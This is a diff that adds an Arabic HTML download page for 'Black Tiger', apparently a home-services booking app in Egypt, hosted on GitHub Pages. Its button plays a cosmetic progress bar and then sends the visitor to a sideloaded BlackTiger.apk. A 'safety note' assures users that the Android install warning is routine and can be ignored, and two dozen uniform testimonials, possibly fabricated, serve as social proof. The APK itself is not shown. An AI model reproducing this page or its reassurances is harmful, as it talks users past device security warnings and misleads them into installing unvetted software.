@@ -1,1 +1,159 @@
-إحنا منصة بتنظم حجز الخدمات المنزلية من خلال التطبيق، مش مكتب تشغيل تقليدي
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>بلاك تايجر للخدمات المنزلية | تحميل التطبيق الرسمي</title>
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://blacktiger-cmd.github.io/BlackTiger-App/">
+    <meta property="og:title" content="بلاك تايجر للخدمات المنزلية | تحميل التطبيق">
+    <meta property="og:description" content="تطبيق بلاك تايجر للخدمات المنزلية: المنصة الرائدة في مصر لتوفير عمالة النظافة، الطباخين، البيبي سيتر، وجليسات المسنين.">
+    <meta property="og:image" content="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=800">
+    <meta property="og:image:secure_url" content="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=800">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Black Tiger">
+
+    <meta name="application-name" content="بلاك تايجر للخدمات المنزلية">
+    <meta name="description" content="تطبيق بلاك تايجر للخدمات المنزلية: المنصة الرائدة في مصر لتوفير عمالة النظافة، الطباخين، البيبي سيتر، وجليسات المسنين. اطلب خدمتك الآن.">
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "SoftwareApplication",
+      "name": "بلاك تايجر للخدمات المنزلية",
+      "operatingSystem": "ANDROID",
+      "applicationCategory": "BusinessApplication",
+      "description": "بلاك تايجر هي الشركة الرسمية والرائدة في مصر لتقديم الخدمات المنزلية. اطلب خدمتك الآن عبر تطبيقنا الرسمي على GitHub.",
+      "url": "https://blacktiger-cmd.github.io/BlackTiger-App/",
+      "author": {
+        "@type": "Organization",
+        "name": "بلاك تايجر مصر"
+      }
+    }
+    </script>
+
+    <link rel="icon" type="image/png" href="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=100">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Cairo', sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; margin: 0; overflow-x: hidden; }
+        .container { width: 90%; max-width: 400px; padding: 20px; text-align: center; }
+        
+        .tiger-frame { width: 100%; height: 250px; border-radius: 30px; overflow: hidden; margin-bottom: 25px; border: 2px solid #ff8c00; box-shadow: 0 10px 30px rgba(255, 140, 0, 0.2); background: #111; }
+        .tiger-frame img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+        h1 { font-size: 36px; color: #ff8c00; font-weight: 900; margin-bottom: 5px; }
+        .subtitle { color: #888; font-size: 17px; margin-bottom: 35px; font-weight: 700; }
+
+        /* الأزرار بتنسيقها القديم */
+        .btn { background: linear-gradient(135deg, #ff8c00 0%, #d35400 100%); color: #fff; font-size: 22px; font-weight: 900; padding: 20px; border-radius: 20px; display: block; border: none; width: 100%; cursor: pointer; box-shadow: 0 12px 25px rgba(211, 84, 0, 0.4); margin-bottom: 15px; text-decoration: none; }
+        
+        /* زرار الفيديو */
+        .btn-video { background: transparent; color: #ff8c00; border: 2px solid #ff8c00; font-size: 18px; padding: 15px; margin-bottom: 10px; display: block; text-decoration: none; border-radius: 20px; font-weight: bold; width: 100%; }
+        
+        /* زرار الآراء */
+        .btn-reviews { background: #1a1a1a; color: #ff8c00; border: 1px solid #ff8c00; font-size: 16px; padding: 12px; box-shadow: none; margin-bottom: 25px; width: 100%; border-radius: 20px; cursor: pointer; display: block; }
+
+        #loading-section { display: none; margin-bottom: 25px; }
+        .progress-bg { width: 100%; background: #222; height: 14px; border-radius: 20px; overflow: hidden; border: 1px solid #333; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff8c00, #ff4500); transition: width 0.3s ease; }
+
+        #reviews-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; padding: 20px; overflow-y: auto; text-align: right; }
+        .review-card { background: #111; padding: 15px; border-radius: 15px; margin-bottom: 12px; border-right: 4px solid #ff8c00; }
+        .review-card h4 { color: #ff8c00; font-size: 16px; margin-bottom: 5px; }
+        .review-card p { color: #ccc; font-size: 14px; }
+
+        .safety-note { margin-top: 25px; font-size: 14px; color: #aaa; background: rgba(255, 140, 0, 0.05); padding: 15px; border-radius: 15px; border: 1px solid #222; }
+        .footer { margin-top: 40px; color: #333; font-size: 12px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="tiger-frame">
+        <img src="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Black Tiger">
+    </div>
+    <h1>BLACK TIGER</h1>
+    <p class="subtitle"> أهلاً بك في تطبيق بلاك تايجر للخدمات المنزليه التطبيق الأقوى فى السوق المصريه </p>
+
+    <div id="loading-section">
+        <div class="progress-bg"><div id="bar" class="progress-bar"></div></div>
+        <div id="msg" style="color: #ff8c00; margin-top: 10px; font-weight: 900;">جاري تحضير الملف... 0%</div>
+    </div>
+    
+    <button id="main-btn" class="btn" onclick="startUpdate()">تحميل الآن</button>
+
+    <a href="https://youtube.com/shorts/jveSOwc1v0Y?feature=share" target="_blank" rel="noopener noreferrer" id="video-btn" class="btn-video">
+        📺 شرح طريقة التحميل (فيديو)
+    </a>
+
+    <button id="rev-btn" class="btn-reviews" onclick="showReviews()">آراء أعضاء بلاك تايجر ⭐</button>
+
+    <div class="safety-note">
+        <span>ملاحظة أمان:</span> تطبيقنا آمن تماماً، التحذير الذي قد يظهر أثناء التثبيت هو إجراء روتيني من نظام الأندرويد. يمكنك إتمام التثبيت بكل طمأنينة.
+    </div>
+    
+    <div class="footer">OFFICIAL BLACK TIGER © 2026</div>
+</div>
+
+<div id="reviews-modal">
+    <h2 style="color: #ff8c00; margin-bottom: 20px; text-align: center;">ماذا يقول أعضاؤنا؟</h2>
+    <div id="reviews-content">
+        <div class="review-card"><h4>مدام نهى (التجمع)</h4><p>بصراحة كنت خايفة في الأول بس الشغالة اللي جتلي محترمة جداً وأمينة وخلصت شغلها بضمير.. شكراً ليكم.</p></div>
+        <div class="review-card"><h4>أستاذ هاني (عامل بوفيه)</h4><p>التطبيق ده فتحلي باب رزق محترم، والشركة بتتعامل معانا بآدمية والفلوس بتوصل في ميعادها.</p></div>
+        <div class="review-card"><h4>دكتورة إيمان</h4><p>البيبي سيتر "ولاء" ممتازة، بنتي حبتها جداً وده أهم حاجة عندي. خدمة 5 نجوم.</p></div>
+        <div class="review-card"><h4>الحاج صبري (المهندسين)</h4><p>جبت جليس مسن لوالدي، راجل خلوق وعارف شغله صح. الله يبارك لكم في شركتكم.</p></div>
+        <div class="review-card"><h4>م. أحمد يحيى</h4><p>الخدمة كويسة جداً بس ياريت تزودوا عدد العمال في منطقة الشيخ زايد عشان المواعيد تظبط أكتر.</p></div>
+        <div class="review-card"><h4>أم مروان (ربة منزل)</h4><p>جربت شركات كتير بس "بلاك تايجر" غير، نظام ونظافة وأدب في التعامل.</p></div>
+        <div class="review-card"><h4>كابتن وليد (سائق)</h4><p>أنا شغال سواق مع الشركة، ناس محترمة جداً في التعامل ومواعيدهم دقيقة.</p></div>
+        <div class="review-card"><h4>منى زكي (عميلة)</h4><p>نظافة السجاد والأنتريه رجعتهم كأنهم لسه جايين من المعرض، تسلم إيديكم.</p></div>
+        <div class="review-card"><h4>أ/ عصام (المعادي)</h4><p>شركة محترمة جداً، ببعت اجيب منها بوابين وسواقين وبجد دايماً بيشرفوني.</p></div>
+        <div class="review-card"><h4>شيماء (عاملة نظافة)</h4><p>الشركة دي بتخاف علينا زي عيالها وبتضمن لنا حقنا من العملاء، ربنا يوفقكم.</p></div>
+        <div class="review-card"><h4>مدام رشا</h4><p>الطباخة اللي جتلي "أم محمد" نفسها في الأكل يجنن، عزومة امبارح كانت مشرفة بجد.</p></div>
+        <div class="review-card"><h4>أستاذ مدحت</h4><p>العمال جم في ميعادهم ومعاهم كل أدواتهم، مخلصين الشغل في وقت قياسي.</p></div>
+        <div class="review-card"><h4>نيرمين صبري</h4><p>أول مرة أحس بأمان وأنا بدخل حد بيتي، الشركة عاملة تحريات كويسة عن العمال.</p></div>
+        <div class="review-card"><h4>إسلام (جنايني)</h4><p>رزقي زاد من يوم ما سجلت في التطبيق، والطلبات بقت تجيلي كل يوم.</p></div>
+        <div class="review-card"><h4>مدام صفاء</h4><p>جبت جليسة مسنة لوالدتي، ست بشوشة جداً وصبورة، ريحتونا من هم كبير.</p></div>
+        <div class="review-card"><h4>أ/ طارق</h4><p>تطبيق سهل والتعامل سريع، بس ياريت يكون فيه شات مباشر مع العمال جوه التطبيق.</p></div>
+        <div class="review-card"><h4>مريم علي</h4><p>خدمة النظافة بعد التشطيب كانت مذهلة، البيت بقى يبرق في يوم واحد.</p></div>
+        <div class="review-card"><h4>حسن (حارس عقار)</h4><p>بشكر الإدارة على الدعم الدائم لينا والرد على استفساراتنا في أي وقت.</p></div>
+        <div class="review-card"><h4>لولا (عميلة)</h4><p>البنات اللي جم نظفوا المطبخ بجد عملوا مجهود جبار، شكراً جداً.</p></div>
+        <div class="review-card"><h4>م/ باسم</h4><p>التطبيق ممتاز وسهل في الاستخدام، والعمال مستواهم الفني عالي.</p></div>
+        <div class="review-card"><h4>أميرة نبيل</h4><p>خدمة العملاء في التليفون ذوق جداً وحلوا لي مشكلة الموعد بسرعة.</p></div>
+        <div class="review-card"><h4>خالد (عامل بوفيه)</h4><p>أنا شغال في شركة من خلال بلاك تايجر والوضع مستقر والراتب ممتاز.</p></div>
+        <div class="review-card"><h4>هدير (ربة منزل)</h4><p>مش هتعامل مع حد تاني غيركم، بجد ريحتوني من لفة المكاتب وضياع الوقت.</p></div>
+        <div class="review-card"><h4>أ/ وائل (أكتوبر)</h4><p>بلاك تايجر يعني الأمان والثقة، بنصح أي حد عايز عمالة بيت يجربهم.</p></div>
+    </div>
+    <button class="btn" style="margin-top: 20px;" onclick="hideReviews()">إغلاق</button>
+</div>
+
+<script>
+    function showReviews() { document.getElementById('reviews-modal').style.display = 'block'; }
+    function hideReviews() { document.getElementById('reviews-modal').style.display = 'none'; }
+    
+    function startUpdate() {
+        document.getElementById('main-btn').style.display = 'none';
+        document.getElementById('rev-btn').style.display = 'none';
+        document.getElementById('video-btn').style.display = 'none';
+        document.getElementById('loading-section').style.display = 'block';
+        let p = 0;
+        let t = setInterval(() => {
+            if (p >= 100) {
+                clearInterval(t);
+                window.location.href = "BlackTiger.apk";
+            } else {
+                p += 5;
+                document.getElementById('bar').style.width = p + '%';
+                document.getElementById('msg').innerHTML = "جاري تحضير ملفات النمر... " + p + "%";
+            }
+        }, 150);
+    }
+</script>
+
+</body>
+</html>
